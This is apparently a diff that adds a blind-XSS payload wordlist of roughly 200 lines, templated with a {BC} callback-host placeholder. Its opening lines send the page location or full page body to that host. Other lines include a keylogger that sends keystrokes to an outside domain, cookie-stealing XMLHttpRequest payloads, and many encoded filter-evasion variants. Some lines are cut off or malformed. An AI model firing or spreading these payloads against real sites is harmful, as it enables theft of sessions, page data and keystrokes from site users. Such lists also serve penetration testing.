@@ -1,0 +1,201 @@
+'"><img src="https://{BC}/image">
+'"><img src="https://{BC}/image-only" onerror='this.src="https://{BC}/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='this.src="https://{BC}/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='this.src="https://"+btoa(document.location)+".{BC}/image-dns?"'>
+'"><img src=x onerror='this.src="https://{BC}/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='fetch("https://{BC}/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
+'"><iframe src='javascript:window.location="https://{BC}/iframe-src?"+btoa(parent.document.location)'></iframe>
+'"><iframe srcdoc='<script>window.location="https://{BC}/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>
+'"><iframe srcdoc='<script>fetch("https://{BC}/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"><object data='javascript:window.location="https://{BC}/iframe-src?"+btoa(parent.document.location)'></object>
+<input onfocus='fetch("https://{BC}/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>
+'"><script src=https://{BC}/script-tag></script>
+'"><script type="text/javascript" src="https://{BC}/script-tag-type"></script>
+'"><script type="module" src="https://{BC}/script-tag-module"></script>
+'"><script nomodule src="https://{BC}/script-tag-nomodule"></script>
+javascript:window.location="https://{BC}/js-scheme?"+btoa(document.location)
+javascript:fetch("https://{BC}/js-scheme-fetch?"+btoa(document.location))
+"><img src="{BC}" onerror="alert(XSS)">
+"><img src="{BC}" onerror=alert('XSS');>
+"><img src="{BC}" onerror=alert(1337)>.gif
+"><img src="{BC}" onerror=alert(String.fromCharCode(88,83,83));>
+"><img src="{BC}" onerror=prompt(1337);>
+"><img src="{BC}" onerror=window.open('https://www.google.com/');>
+"><script src="{BC}" 
+%253caudio autoplay controls onpause=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay controls onseeked=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay controls onseeking=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay controls onvolumechange=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay onloadedmetadata=ALERT(1337)%253E %253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay onplay=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio autoplay onplaying=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio controls autoplay onended=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio controls autoplay ontimeupdate=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio oncanplay=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253caudio onloadeddata=ALERT(1337)%253E%253csource src="{BC}" type="audio/wav"%253E%253c/audio%253E
+%253cembed src="{BC}" onerror=ALERT(1337) type=image/gif%253E
+%253cembed src="{BC}" onload=ALERT(1337)%253E
+%253cimage src="{BC}" onload=ALERT(1337)%253E
+%253cimage src="{BC}" onloadend=ALERT(1337)%253E
+%253cimage src="{BC}" onloadstart=ALERT(1337)%253E
+%253cimg src="{BC}" onload=ALERT(1337)%253E
+%253cimg src="{BC}" onloadend=ALERT(1337)%253E
+%253cimg src="{BC}" onloadstart=ALERT(1337)%253E
+%253cinput type=image src="{BC}" onerror=ALERT(1337)%253E
+%253cinput type=image src="{BC}" onload=ALERT(1337)%253E
+%253cisindex type=image src="{BC}" onerror=ALERT(1337)%253E
+%253clink href="{BC}" rel=stylesheet onload=ALERT(1337)%253E
+%253clink rel=stylesheet href="{BC}" onerror=ALERT(1337)%253E
+%253csvg%253E%253cimage href="{BC}" onerror=ALERT(1337)%253E
+%253csvg%253E%253cimage href="{BC}" onload=ALERT(1337)%253E
+%253cvideo autoplay controls onpause=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay controls onseeked=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay controls onseeking=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay controls onvolumechange=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay controls onwaiting=ALERT(1337)%253E%253csource src="{BC}" type=video/mp4%253E%253c/video%253E
+%253cvideo autoplay onloadedmetadata=ALERT(1337)%253E %253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay onplay=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo autoplay onplaying=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo controls autoplay onended=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo controls autoplay ontimeupdate=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo id=x controls onfocus=ALERT(1337)%253E%253csource src="{BC}" type=video/mp4%253E%253c/video%253E
+%253cvideo id=x controls onfocusin=ALERT(1337)%253E%253csource src="{BC}" type=video/mp4%253E%253c/video%253E
+%253cvideo oncanplay=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo oncanplaythrough=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+%253cvideo onloadeddata=ALERT(1337)%253E%253csource src="{BC}" type="video/mp4"%253E%253c/video%253E
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1337)><script>prompt(1337)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1337)</script>"><img/id="confirm&lpar;1)"/alt="/"src="{BC}" src="http://i.imgur.com/P8mL8.jpg">
+<! '="foo"><x foo='><img src="{BC}" onerror=alert(1337)//'>
+<!--[if<img src="{BC}" onerror=alert(1337)//]> -->//["'`-->]]>]</div>
+<![><img src="]><img src="{BC}" onerror=alert(39)//">
+<!a foo=x=`y><img alt="`><img src="{BC}" onerror=alert(1337)//">
+<--`<img/src="{BC}" onerror=alert(1337)> --!>
+<? '="foo"><x foo='><img src="{BC}" onerror=alert(3)//'>//["'`-->]]>]</div>
+<?a foo=x=`y><img alt="`><img src="{BC}" onerror=alert(3)//">//["'`-->]]>]</div>
+<?xml-stylesheet type="text/xsl" href="{BC}" version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+<a  href="{BC}"  Me</a>
+<a href="{BC}" 
+<a href="{BC}" Here</a>
+<a href="{BC}" alt="`><img src="{BC}" onerror=alert(108)></a>">
+<a href="{BC}" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+<a target="x" href="{BC}" cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src="{BC}" name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+<a target="x" href="{BC}" var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+<a target="x" href="{BC}" x(window) { eval(location.hash.substr(1)) }</script><iframe src="{BC}" xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="{BC}" width="1000" height="1000" fill="white"/></a>
+<animation xlink:href="{BC}" xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<audio autoplay controls onpause=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio autoplay controls onseeked=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio autoplay controls onvolumechange=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1337)> <source src="{BC}" type="audio/wav"></audio>
+<audio autoplay onplay=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio controls autoplay onended=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio controls autoplay ontimeupdate=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio oncanplay=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<audio onloadeddata=alert(1337)><source src="{BC}" type="audio/wav"></audio>
+<body onhashchange=alert(1337)><a href="{BC}" this!#x
+<body><a href="{BC}" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1337)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="{BC}" id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(1337)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="{BC}" id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
+<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="{BC}" id="102"><img src="{BC}" `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
+<div id="105"><iframe src="{BC}" id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+<div id="119"><iframe src="{BC}" frameborder="0" style="width:400px;height:180px"></iframe>
+<div id="124"><script src="{BC}" // Safari 5.0, Chrome 9, 10
+<div id="128"><svg><style>&lt;img/src="{BC}" onerror=alert(128)// </b>//["'`-->]]>]</div>
+<div id="133"><!-- `<img/src="{BC}" onerror=alert(133)//--!>//["'`-->]]>]</div>
+<div id="135"><?xml-stylesheet type="text/xsl" href="{BC}" ?>
+<div id="138"><link rel="import" href="{BC}" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(1337)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href="{BC}" strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src="{BC}" onerror=alert(38)//">//["'`-->]]>]</div>
+<div id="40"><style><img src="</style><img src="{BC}" onerror=alert(40)//">//["'`-->]]>]</div>
+<div id="42"><head><base href="javascript://"/></head><body><a href="{BC}" /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
+<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="{BC}" id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
+<div id="63"><embed src="{BC}" // O10.10↓, OM10.0↓, GC6↓, FF
+<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">   <html:style /><x xlink:href="{BC}" xlink:type="simple">XXX</x></doc>//["'`-->]]>]</div>
+<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="{BC}" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="{BC}" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
+<embed src="{BC}" 
+<embed src="{BC}" ?
+<embed src="{BC}" onerror=alert(1337) type=image/gif>
+<embed src="{BC}" onload=alert(1337)>
+<foreignObject xlink:href="{BC}" xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>
+<form><input formaction=javascript:alert(1337) type=image src="{BC}" 
+<iframe  src="{BC}" ?
+<iframe id=%22ifra%22 src="{BC}" <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
+<iframe src="{BC}" 
+<iframe src="{BC}" onload&equals;alert&lpar;1&rpar;&gt;'>
+<iframe src="{BC}" onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src="{BC}" onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src="{BC}" onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src="{BC}" onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src="{BC}" onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
+<iframe src="{BC}" onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
+<iframe src="{BC}" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
+<iframe/src="{BC}" onload=alert(1337)>">
+<image src="{BC}" // IE6, O10.10↓, OM10.0↓
+<image src="{BC}" onload=alert(1337)>
+<image src="{BC}" onloadend=alert(1337)>
+<image src="{BC}" onloadstart=alert(1337)>
+<image xlink:href="{BC}" xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>
+<img  src="{BC}" onerror="window['al\u0065rt'](0)"></img>
+<img alt='%></xmp><img src="{BC}" onerror=aler
+<img alt='%></xmp><img src="{BC}" onerror=alert(134)//'>
+<img src="{BC}" =_=" title="onerror='prompt(1337)'">
+<img src="{BC}" =_=" title="onerror='prompt(1337)'">
+<img src="{BC}" alt=al lang=ert onerror=top[alt+lang](0)>
+<img src="{BC}" oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src="{BC}" onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+<img src="{BC}" onerror=alert('XSS')//
+<img src="{BC}" onerror=alert('XSS');>
+<img src="{BC}" onerror=alert(String.fromCharCode(88,83,83));>
+<img src="{BC}" onerror=eval(src) alt=0>
+<img src="{BC}" onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<img src="{BC}" onerror=eval(src) alt=xss>
+<img src="{BC}" onerror\x00=alert(0) />
+<img src="{BC}" onerror\x0b=alert(0) />
+<img src="{BC}" onload=alert(1337)>
+<img src="{BC}" onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
+<img src="{BC}" onloadend=alert(1337)>
+<img src="{BC}" onloadstart=alert(1337)>
+<input type=image src="{BC}" onerror=alert(1337)>
+<input type=image src="{BC}" onload=alert(1337)>
+<isindex type=image src="{BC}" onerror=alert(1337)>
+<isindex type=image src="{BC}" onerror=alert(XSS)>
+<label dataformatas="html" datasrc="{BC}" datafld="payload"></label>//["'`-->]]>]</div>
+<link href="{BC}" rel=stylesheet onload=alert(1337)>
+<link rel=import href="{BC}" 
+<link rel=stylesheet href="{BC}" onerror=alert(1337)>
+<math><brute href="{BC}" 
+<math><brute xlink:href="{BC}" 
+<script src="{BC}" 
+<script src="{BC}" // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+<script src="{BC}" // Safari 5.0//["'`-->]]>]</div>
+<script/src="{BC}" ?
+<script/src="{BC}" ????????????
+<script/src="{BC}" a=\u0061 & /=%2F
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src="{BC}" onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
+<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src="{BC}" xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<script>x=document.createElement(%22iframe%22);x.src="{BC}" XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
+<script>x=document.createElement(%22iframe%22);x.src="{BC}" top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
+<svg><![CDATA[><image xlink:href="{BC}" src="{BC}" onerror=alert(1337)//"></svg>//["'`-->]]>]</div>
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href="{BC}" r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1337) to=&>
+<svg><image href="{BC}" onerror=alert(1337)>
+<svg><image href="{BC}" onload=alert(1337)>
+<svg><script xlink:href="{BC}" /> 
+<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href="{BC}" autofocus></textarea>
+<video autoplay controls onpause=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video autoplay controls onseeked=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video autoplay controls onseeking=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video autoplay controls onvolumechange=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video autoplay controls onwaiting=alert(1337)><source src="{BC}" type=video/mp4></video>
+<video autoplay onloadedmetadata=alert(1337)> <source src="{BC}" type="video/mp4"></video>
+<video autoplay onplay=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video autoplay onplaying=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video controls autoplay onended=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video controls autoplay ontimeupdate=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video id=x controls onfocus=alert(1337)><source src="{BC}" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1337)><source src="{BC}" type=video/mp4></video>
+<video oncanplay=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video oncanplaythrough=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video onloadeddata=alert(1337)><source src="{BC}" type="video/mp4"></video>
+<video src="{BC}" onloadstart="alert(1337)">
+<x '="foo"><x foo='><img src="{BC}" onerror=alert(62)//'>
+<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/"><iframe xmlns="http://www.w3.org/1999/xhtml" src="{BC}"        </xsl:template></xsl:stylesheet><circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
+Exploit String: <img src="{BC}" onrerror= ` ;; alert(1337) ` />
